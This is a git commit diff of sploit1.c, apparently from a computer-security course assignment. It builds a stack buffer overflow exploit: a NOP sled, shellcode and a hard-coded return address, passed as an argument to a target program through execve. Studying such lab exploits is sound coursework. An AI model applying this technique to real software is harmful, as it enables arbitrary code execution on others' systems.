df95dc664d7fe5002a93f3266ef28c8c3c6a54ae
justinhalford <justinhalford@gmail.com>
2024-05-08 13:06:51 -0400

    may 7

--- cs5435-hw4/sploits/sploit1.c
+++ cs5435-hw4/sploits/sploit1.c
@@ -9,17 +9,28 @@
 
 int main(void)
 {
+    char exploit[20]; // Adjusted to the required size
     char *args[3];
-    char *env[2];
+    char *env[1];
+
+    // Fill with NOP sled initially
+    memset(exploit, 0x90, sizeof(exploit));
+
+    // Place the shellcode at the start of the buffer
+    memcpy(exploit, shellcode, sizeof(shellcode) - 1);
+
+    // Overwrite the return address to point to the shellcode
+    uint32_t ret_address = 0xffffd4bc; // Start of the buffer
+    memcpy(exploit + 16, &ret_address, 4);
 
     args[0] = TARGET;
-    args[1] = "\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\xf4\xd3\xff\xff";
+    args[1] = exploit;
     args[2] = NULL;
 
-    env[0] = shellcode;
-    env[1] = NULL;
+    env[0] = NULL;
 
     execve(TARGET, args, env);
     fprintf(stderr, "execve failed.\n");
+
     return 0;
 }
